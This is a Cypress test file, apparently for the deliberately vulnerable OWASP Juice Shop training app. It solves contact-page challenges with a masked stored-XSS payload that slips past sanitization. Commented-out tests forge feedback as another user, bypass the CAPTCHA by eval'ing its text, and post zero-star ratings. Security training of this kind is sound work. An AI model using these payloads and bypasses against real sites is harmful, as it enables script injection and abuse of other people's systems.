describe("/#/contact", () => {
  beforeEach(() => {
    cy.login({ email: "admin", password: "admin123" });

    cy.visit("/#/contact");
    cy.wait(500);
    // for recaptcha to load

    // comment = element(by.id("comment"));
    // rating = element(by.id("rating"));
    // captcha = element(by.id("captchaControl"));
    // submitButton = element(by.id("submitButton"));
    // snackBar = element(
    //   by.css(".mat-simple-snackbar-action.ng-star-inserted")
    // ).element(by.css(".mat-focus-indicator.mat-button.mat-button-base"));
    solveNextCaptcha();
  });

  // describe('challenge "forgedFeedback"', () => {
  //   it("should be possible to provide feedback as another user", () => {
  //     cy.visit("/#/contact");

  //     cy.window().then((win) => {
  //       win.eval(
  //         'document.getElementById("userId").removeAttribute("hidden");'
  //       );
  //       win.eval('document.getElementById("userId").removeAttribute("class");');
  //     });

  //     cy.get("#userId").clear().type("2");
  //     cy.get("#comment").type("Picard stinks!");
  //     cy.get("#rating").click();

  //     cy.get("#submitButton").click();

  //     cy.visit("/#/administration");
  //     cy.get("mat-row mat-cell.mat-column-user")
  //       .last()
  //       .then(($ele) => {
  //         expect($ele.text()).to.contain("2");
  //       });
  //     cy.expectChallengeSolved({ challenge: "Forged Feedback" });
  //   });
  // });

  // if (!utils.disableOnContainerEnv()) {
  describe('challenge "persistedXssFeedback"', () => {
    it("should be possible to trick the sanitization with a masked XSS attack", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.get("#comment").type(
            '<<script>Foo</script>iframe src="javascript:alert(`xss`)">'
          );

          // the same issue here i.e. alert window takes over the testing environment
          cy.get("#rating").click();
          cy.get("#submitButton").click();

          cy.visit("/#/about");
          cy.on("window:alert", (t) => {
            expect(t).to.equal("xss");
          });
          cy.visit("/#/administration");

          cy.on("window:alert", (t) => {
            expect(t).to.equal("xss");
          });
          cy.get(".mat-cell.mat-column-remove > button").last().click();

          cy.expectChallengeSolved({ challenge: "Server-side XSS Protection" });
        }
      });
    });
  });
  // }

  // describe('challenge "vulnerableComponent"', () => {
  //   it("should be possible to post known vulnerable component(s) as feedback", () => {
  //     void comment.sendKeys("sanitize-html 1.4.2 is non-recursive.");
  //     void comment.sendKeys("express-jwt 0.1.3 has broken crypto.");
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Vulnerable Library" });
  // });

  // describe('challenge "weirdCrypto"', () => {
  //   it("should be possible to post weird crypto algorithm/library as feedback", () => {
  //     void comment.sendKeys(
  //       "The following libraries are bad for crypto: z85, base85, md5 and hashids"
  //     );
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Weird Crypto" });
  // });

  // describe('challenge "typosquattingNpm"', () => {
  //   it("should be possible to post typosquatting NPM package as feedback", () => {
  //     void comment.sendKeys(
  //       "You are a typosquatting victim of this NPM package: epilogue-js"
  //     );
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Legacy Typosquatting" });
  // });

  // describe('challenge "typosquattingAngular"', () => {
  //   it("should be possible to post typosquatting Bower package as feedback", () => {
  //     void comment.sendKeys(
  //       "You are a typosquatting victim of this Bower package: anuglar2-qrcode"
  //     );
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Frontend Typosquatting" });
  // });

  // describe('challenge "hiddenImage"', () => {
  //   it("should be possible to post hidden character name as feedback", () => {
  //     void comment.sendKeys(
  //       "Pickle Rick is hiding behind one of the support team ladies"
  //     );
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Steganography" });
  // });

  // describe('challenge "zeroStars"', () => {
  //   it("should be possible to post feedback with zero stars by double-clicking rating widget", () => {
  //     void browser.executeAsyncScript((baseUrl: string) => {
  //       // @ts-expect-error
  //       const callback = arguments[arguments.length - 1];
  //       const xhttp = new XMLHttpRequest();
  //       let captcha;
  //       xhttp.onreadystatechange = function () {
  //         if (this.status === 200) {
  //           captcha = JSON.parse(this.responseText);
  //           sendPostRequest(captcha);
  //         }
  //       };

  //       xhttp.open("GET", `${baseUrl}/rest/captcha/`, true);
  //       xhttp.setRequestHeader("Content-type", "text/plain");
  //       xhttp.send();

  //       function sendPostRequest(_captcha: {
  //         captchaId: number;
  //         answer: string;
  //       }) {
  //         const xhttp = new XMLHttpRequest();
  //         xhttp.onreadystatechange = function () {
  //           if (this.status === 201) {
  //             console.log("Success");
  //             callback();
  //           }
  //         };

  //         xhttp.open("POST", `${baseUrl}/api/Feedbacks`, true);
  //         xhttp.setRequestHeader("Content-type", "application/json");
  //         xhttp.send(
  //           JSON.stringify({
  //             captchaId: _captcha.captchaId,
  //             captcha: `${_captcha.answer}`,
  //             comment: "Comment",
  //             rating: 0,
  //           })
  //         ); // eslint-disable-line
  //       }
  //     }, browser.baseUrl);
  //   });

  //   expectChallengeSolved({ challenge: "Zero Stars" });
  // });

  // describe('challenge "captchaBypass"', () => {
  //   const EC = protractor.ExpectedConditions;
  //   xit("should be possible to post 10 or more customer feedbacks in less than 10 seconds", () => {
  //     void browser.waitForAngularEnabled(false);

  //     for (let i = 0; i < 11; i++) {
  //       void comment.sendKeys(`Spam #${i}`);
  //       void rating.click();
  //       void submitButton.click();
  //       void browser.wait(
  //         EC.visibilityOf(snackBar),
  //         200,
  //         "SnackBar did not become visible"
  //       );
  //       void snackBar.click();
  //       void browser.sleep(200);
  //       solveNextCaptcha(); // first CAPTCHA was already solved in beforeEach
  //     }

  //     void browser.waitForAngularEnabled(true);
  //   });

  //   // expectChallengeSolved({ challenge: 'CAPTCHA Bypass' })
  // });

  // describe('challenge "supplyChainAttack"', () => {
  //   it("should be possible to post GitHub issue URL reporting malicious eslint-scope package as feedback", () => {
  //     void comment.sendKeys(
  //       "Turn on 2FA! Now!!! https://github.com/eslint/eslint-scope/issues/39"
  //     );
  //     void rating.click();

  //     void submitButton.click();
  //   });

  //   expectChallengeSolved({ challenge: "Supply Chain Attack" });
  // });

  // describe('challenge "dlpPastebinDataLeak"', () => {
  //   it("should be possible to post dangerous ingredients of unsafe product as feedback", () => {
  //     // @ts-expect-error
  //     void comment.sendKeys(
  //       pastebinLeakProduct.keywordsForPastebinDataLeakChallenge.toString()
  //     );
  //     void rating.click();
  //     void submitButton.click();
  //   });
  //   expectChallengeSolved({ challenge: "Leaked Unsafe Product" });
  // });

  function solveNextCaptcha() {
    cy.get("#captcha").then(($text) => {
      cy.get("#captchaControl").clear();
      // void captcha.clear();

      // rating = element(by.id("rating"));
      // captcha = element(by.id("captchaControl"));
      // submitButton = element(by.id("submitButton"));
      // snackBar = element(
      //   by.css(".mat-simple-snackbar-action.ng-star-inserted")
      // ).element(by.css(".mat-focus-indicator.mat-button.mat-button-base"));

      const answer = eval($text.text()).toString(); // eslint-disable-line no-eval
      cy.get("#captchaControl").type(answer);
    });
  }
});
